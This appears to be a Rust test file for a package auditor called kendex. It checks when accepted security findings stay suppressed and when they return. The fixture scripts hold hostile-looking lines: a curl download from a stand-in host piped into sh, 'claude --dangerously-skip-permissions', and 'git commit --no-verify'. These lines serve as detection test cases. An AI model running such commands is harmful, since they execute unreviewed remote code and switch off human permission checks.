//! What kendex's table of accepted findings sets aside, and what puts a
//! finding back: one table over the ways a reading can differ from the
//! row that accepted it, and the publisher a row is honoured for.

use crate::test_util;
use test_util::rooted;

use std::path::PathBuf;

use kendex_core::hash::hash_bytes;
use kendex_core::model::ItemKind;
use kendex_core::quality::{
    Accepted, AcceptedFile, Allowance, AllowedPackage, AuditInput, AuditResult, Content, Publisher,
    RULESET_VERSION, audit_with, observe,
};

const SCRIPT: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\n";
/// The line of `SCRIPT` the switch's finding fires on.
const LAUNCH: &str = "claude --dangerously-skip-permissions";
const SWITCH: &str = "`--dangerously-skip-permissions` turns off permission prompts";
/// The script with a trailing comment on the switch's line, with a
/// variation selector the rules read past on it, with a line inserted
/// above it, with the shebang edited, with the line twice, and with a
/// second switch on a line of its own.
const EDITED: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions # now\n";
const UNSEEN: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\u{FE0F}\n";
const INSERTED: &str =
    "#!/usr/bin/env bash\n# launches the lane\nclaude --dangerously-skip-permissions\n";
const SHEBANG: &str = "#!/bin/bash\nclaude --dangerously-skip-permissions\n";
const TWICE: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\nclaude --dangerously-skip-permissions\n";
const TWO: &str =
    "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\ngit commit --no-verify\n";
/// The switch, then a download piped into a shell: two rules whose
/// findings the rules raise in the other order.
const TWO_RULES: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\ncurl https://x.example/i.sh | sh\n";
const PIPED: &str = "this line pipes a download straight into a shell from `https://x.example/i.sh`, so whatever the far end serves is what runs";
const SKILL_MD: &str = "---\nname: launch\ndescription: launches a lane\n---\n\nLaunch it.\n";

/// The table that accepts the switch on the fixture's `LAUNCH` line.
fn accepting(kind: ItemKind, name: &str, path: &str) -> Allowance {
    Allowance {
        ruleset: RULESET_VERSION,
        packages: vec![AllowedPackage {
            kind,
            name: name.to_owned(),
            files: vec![AcceptedFile {
                path: path.to_owned(),
                accepted: vec![Accepted {
                    rule: "safety-bypass".to_owned(),
                    line_hash: hash_bytes(LAUNCH.as_bytes()),
                    message: SWITCH.to_owned(),
                }],
            }],
        }],
    }
}

fn skill(script: &str, publisher: Publisher, allowance: &Allowance) -> AuditResult {
    audit_with(
        AuditInput {
            kind: ItemKind::Skill,
            name: "launch".to_owned(),
            harness: None,
            location: "skills/launch".to_owned(),
            publisher,
            content: observe::tree_content_from_bytes(&[
                (PathBuf::from("SKILL.md"), SKILL_MD.as_bytes().to_vec()),
                (
                    PathBuf::from("scripts/launch.sh"),
                    script.as_bytes().to_vec(),
                ),
            ]),
        },
        allowance,
    )
}

/// Where findings stand: location and line.
type Placed<'a> = Vec<(&'a str, Option<u32>)>;

/// One row of the shape table: its name, the script, whose item it is,
/// the table, the lines flagged and the lines accepted.
type Row<'a> = (&'a str, &'a str, Publisher, Allowance, &'a [u32], &'a [u32]);

fn placed(findings: &[kendex_core::quality::Finding]) -> Placed<'_> {
    findings
        .iter()
        .map(|finding| (finding.location.as_str(), finding.line))
        .collect()
}

/// The table with its one row changed.
fn row_edited(edit: impl FnOnce(&mut Accepted)) -> Allowance {
    let mut table = accepting(ItemKind::Skill, "launch", "scripts/launch.sh");
    edit(&mut table.packages[0].files[0].accepted[0]);
    table
}

/// Every way the reading can differ from the row that accepted it, each
/// with the lines flagged and the lines accepted in the script.
fn rows() -> Vec<Row<'static>> {
    use Publisher::{Kendex, Other};
    let base = || accepting(ItemKind::Skill, "launch", "scripts/launch.sh");
    vec![
        ("as recorded", SCRIPT, Kendex, base(), &[], &[2]),
        ("a line inserted above", INSERTED, Kendex, base(), &[], &[3]),
        ("another line edited", SHEBANG, Kendex, base(), &[], &[2]),
        (
            "the same bytes from another source",
            SCRIPT,
            Other,
            base(),
            &[2],
            &[],
        ),
        ("the line edited", EDITED, Kendex, base(), &[2], &[]),
        ("the line edited unseen", UNSEEN, Kendex, base(), &[2], &[]),
        ("the line twice", TWICE, Kendex, base(), &[3], &[2]),
        ("a second finding there", TWO, Kendex, base(), &[3], &[2]),
        (
            "another rule set",
            SCRIPT,
            Kendex,
            Allowance {
                ruleset: RULESET_VERSION + 1,
                ..base()
            },
            &[2],
            &[],
        ),
        (
            "another package name",
            SCRIPT,
            Kendex,
            accepting(ItemKind::Skill, "launcher", "scripts/launch.sh"),
            &[2],
            &[],
        ),
        (
            "another kind",
            SCRIPT,
            Kendex,
            accepting(ItemKind::Command, "launch", "scripts/launch.sh"),
            &[2],
            &[],
        ),
        (
            "another path",
            SCRIPT,
            Kendex,
            accepting(ItemKind::Skill, "launch", "launch.sh"),
            &[2],
            &[],
        ),
        (
            "another rule",
            SCRIPT,
            Kendex,
            row_edited(|row| row.rule = "rce".to_owned()),
            &[2],
            &[],
        ),
        (
            "another line's text",
            SCRIPT,
            Kendex,
            row_edited(|row| row.line_hash = hash_bytes(b"#!/usr/bin/env bash")),
            &[2],
            &[],
        ),
        (
            "another message",
            SCRIPT,
            Kendex,
            row_edited(|row| row.message = "`--no-verify` skips".to_owned()),
            &[2],
            &[],
        ),
        ("no table", SCRIPT, Kendex, Allowance::default(), &[2], &[]),
        (
            "two rules accepted, listed in place order",
            TWO_RULES,
            Kendex,
            {
                let mut table = base();
                table.packages[0].files[0].accepted.push(Accepted {
                    rule: "rce".to_owned(),
                    line_hash: hash_bytes(b"curl https://x.example/i.sh | sh"),
                    message: PIPED.to_owned(),
                });
                table
            },
            &[],
            &[2, 3],
        ),
    ]
}

/// One row per way the reading can differ from the row that accepted it.
/// Every difference is a finding again: only kendex's own item, at the
/// exact text of the line, under the accepting rule set, at the recorded
/// row, one finding per row. An edit to any other line, one that moves the
/// accepted line included, changes nothing.
#[test]
fn a_finding_is_accepted_only_for_kendex_at_the_exact_text_the_table_names() {
    let at = "skills/launch/scripts/launch.sh";
    for (row, script, publisher, allowance, flagged, accepted) in rows() {
        let result = skill(script, publisher, &allowance);
        let lines = |findings: &[kendex_core::quality::Finding]| -> Vec<u32> {
            placed(findings)
                .into_iter()
                .map(|(location, line)| {
                    assert_eq!(location, at, "{row}");
                    line.unwrap_or_else(|| panic!("{row}: a line rule fired without a line"))
                })
                .collect()
        };
        assert_eq!(
            lines(&result.findings),
            flagged,
            "{row}: {:#?}",
            result.findings
        );
        assert_eq!(
            lines(&result.accepted),
            accepted,
            "{row}: {:#?}",
            result.accepted
        );
        let score = match flagged.is_empty() {
            true => 100,
            false => 75,
        };
        assert_eq!(result.safety.score, score, "{row}");
    }
}

/// A row names a file inside a tree and nothing else: a package that is
/// one file has no path inside itself, so no row reaches it, whatever
/// path the row spells.
#[test]
fn a_one_file_package_is_never_accepted() {
    let text = "---\ndescription: ship it\n---\nclaude --dangerously-skip-permissions\n";
    let input = || AuditInput {
        kind: ItemKind::Command,
        name: "ship".to_owned(),
        harness: None,
        location: "commands/ship.md".to_owned(),
        publisher: Publisher::Kendex,
        content: Content::Document {
            text: text.to_owned(),
        },
    };
    for path in ["", "ship.md", "commands/ship.md"] {
        let table = accepting(ItemKind::Command, "ship", path);
        let result = audit_with(input(), &table);
        assert_eq!(
            placed(&result.findings),
            vec![("commands/ship.md", Some(4))],
            "path {path:?}: {:#?}",
            result.findings
        );
        assert_eq!(placed(&result.accepted), vec![], "path {path:?}");
    }
}

/// The table round-trips through its file form, header included, so what
/// the refresh writes is what the build reads back; and a key the reader
/// does not read is refused by name at every level of the table, never
/// dropped.
#[test]
#[allow(clippy::unwrap_used)]
fn the_table_reads_back_as_written_and_refuses_a_key_it_does_not_read() {
    let table = accepting(ItemKind::Skill, "launch", "scripts/launch.sh");
    let text = table.to_toml().unwrap();
    assert!(text.starts_with("# Findings kendex accepts"), "{text}");
    assert_eq!(Allowance::parse(&text).unwrap(), table, "{text}");

    // One planted key per table, each under the header line that opens it.
    let planted = [
        ("ruleset = ", "at the top level"),
        ("[[package]]\n", "in a package"),
        ("[[package.file]]\n", "in a file"),
        ("[[package.file.finding]]\n", "in a finding"),
    ];
    for (after, level) in planted {
        let at = text
            .find(after)
            .unwrap_or_else(|| panic!("{level}: {after:?} in {text}"));
        let line_end = at + text[at..].find('\n').unwrap() + 1;
        let refused = format!("{}extra = 1\n{}", &text[..line_end], &text[line_end..]);
        let why = Allowance::parse(&refused)
            .err()
            .unwrap_or_else(|| panic!("a key {level} was dropped: {refused}"))
            .to_string();
        assert!(why.contains("extra"), "{level}: {why}");
    }
}

/// The interleaved script: three findings under two rules, a switch, a
/// download piped into a shell, the switch again.
const INTERLEAVED: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\ncurl https://x.example/i.sh | sh\nclaude --dangerously-skip-permissions\n";

/// A catalog holding one skill whose script is `script`.
#[allow(clippy::unwrap_used)]
fn catalog(script: &str) -> (tempfile::TempDir, kendex_core::source_read::SealedSource) {
    let tmp = tempfile::tempdir().unwrap();
    let root = rooted(&tmp);
    let scripts = root.join("skills/launch/scripts");
    std::fs::create_dir_all(&scripts).unwrap();
    std::fs::write(root.join("skills/launch/SKILL.md"), SKILL_MD).unwrap();
    std::fs::write(scripts.join("launch.sh"), script).unwrap();
    std::fs::write(root.join("kendex.toml"), "is_source_catalog = true\n").unwrap();
    let sealed = kendex_core::source_read::SealedSource::open(&root).unwrap();
    (tmp, sealed)
}

/// A row written by hand for each finding of `INTERLEAVED`, in rule order
/// A, B, A, with stale line hashes and messages.
fn interleaved_rows() -> Allowance {
    let row = |rule: &str| Accepted {
        rule: rule.to_owned(),
        line_hash: "stale".to_owned(),
        message: "stale".to_owned(),
    };
    Allowance {
        ruleset: RULESET_VERSION,
        packages: vec![AllowedPackage {
            kind: ItemKind::Skill,
            name: "launch".to_owned(),
            files: vec![AcceptedFile {
                path: "scripts/launch.sh".to_owned(),
                accepted: vec![row("safety-bypass"), row("rce"), row("safety-bypass")],
            }],
        }],
    }
}

/// The refresh reads every listed row again whatever order the rules
/// interleave in: each rule once, one finding per row, written back in
/// line order, each keyed by its own line's text. A line inserted above
/// the findings moves them and leaves the refreshed table as it was; an
/// edit to an accepted line is written back as that line's new key; and a
/// refresh of its own output is a fixed point.
#[test]
#[allow(clippy::unwrap_used)]
fn the_refresh_reads_interleaved_rules_once_each_and_keys_each_row_by_its_line() {
    let (_tmp, sealed) = catalog(INTERLEAVED);
    let config = kendex_core::source::source_config(&sealed, "cat").unwrap();
    let script = sealed.root().join("skills/launch/scripts/launch.sh");
    let refreshed = interleaved_rows().refreshed(&sealed, &config).unwrap();
    let rows = |table: &Allowance| -> Vec<(String, String)> {
        table.packages[0].files[0]
            .accepted
            .iter()
            .map(|row| (row.rule.clone(), row.line_hash.clone()))
            .collect()
    };
    let keyed = |rule: &str, line: &str| (rule.to_owned(), hash_bytes(line.as_bytes()));
    let piped = "curl https://x.example/i.sh | sh";
    assert_eq!(
        rows(&refreshed),
        vec![
            keyed("safety-bypass", LAUNCH),
            keyed("rce", piped),
            keyed("safety-bypass", LAUNCH),
        ],
        "{refreshed:#?}"
    );
    assert!(
        refreshed.packages[0].files[0]
            .accepted
            .iter()
            .all(|row| row.message != "stale"),
        "{refreshed:#?}"
    );
    assert_eq!(refreshed.refreshed(&sealed, &config).unwrap(), refreshed);

    // A comment above the first switch moves every finding down a line;
    // nothing the rows name changes.
    std::fs::write(&script, format!("# launches the lane\n{INTERLEAVED}")).unwrap();
    assert_eq!(refreshed.refreshed(&sealed, &config).unwrap(), refreshed);

    // A comment on the piped line is an edit to that line alone.
    let edited = INTERLEAVED.replace(piped, &format!("{piped} # bootstrap"));
    std::fs::write(&script, edited).unwrap();
    let following = refreshed.refreshed(&sealed, &config).unwrap();
    assert_eq!(
        rows(&following),
        vec![
            keyed("safety-bypass", LAUNCH),
            keyed("rce", &format!("{piped} # bootstrap")),
            keyed("safety-bypass", LAUNCH),
        ],
        "{following:#?}"
    );
}

/// One row per refusal the refresh makes, each with the words the error
/// names its cause by: a package the catalog does not offer, a file the
/// package does not hold as text, a file whose findings under a rule are
/// not one per listed row, in either direction, and a row for a finding
/// at no line, which has no line text to key it by. A refusal in place of
/// a rewrite is what keeps a finding nobody accepted out of the table.
#[test]
#[allow(clippy::unwrap_used)]
fn the_refresh_refuses_each_row_the_catalog_no_longer_warrants() {
    let with = |edit: fn(&mut Allowance)| {
        let mut table = interleaved_rows();
        edit(&mut table);
        table
    };
    let rows: Vec<(&str, &str, Allowance, &[&str])> = vec![
        (
            "a package the catalog does not offer",
            INTERLEAVED,
            with(|table| table.packages[0].name = "launcher".to_owned()),
            &["launcher"],
        ),
        (
            "a file the package does not hold",
            INTERLEAVED,
            with(|table| table.packages[0].files[0].path = "scripts/gone.sh".to_owned()),
            &["launch", "scripts/gone.sh", "does not hold"],
        ),
        (
            "a rule raised once more than listed",
            INTERLEAVED,
            with(|table| {
                table.packages[0].files[0].accepted.pop();
            }),
            &[
                "scripts/launch.sh",
                "1 accepted safety-bypass",
                "now holds 2",
            ],
        ),
        (
            "a rule listed once more than raised",
            INTERLEAVED,
            with(|table| {
                let extra = table.packages[0].files[0].accepted[1].clone();
                table.packages[0].files[0].accepted.push(extra);
            }),
            &["scripts/launch.sh", "2 accepted rce", "now holds 1"],
        ),
        (
            "a finding at no line",
            "#!/usr/bin/env bash\necho re\u{200B}ady\n",
            with(|table| {
                table.packages[0].files[0].accepted = vec![Accepted {
                    rule: "obfuscated-content".to_owned(),
                    line_hash: "stale".to_owned(),
                    message: "stale".to_owned(),
                }];
            }),
            &["scripts/launch.sh", "obfuscated-content", "at no line"],
        ),
    ];
    for (row, script, table, expected) in rows {
        let (_tmp, sealed) = catalog(script);
        let config = kendex_core::source::source_config(&sealed, "cat").unwrap();
        let refused = table.refreshed(&sealed, &config).unwrap_err().to_string();
        for words in expected {
            assert!(refused.contains(words), "{row}: {refused}");
        }
    }
}
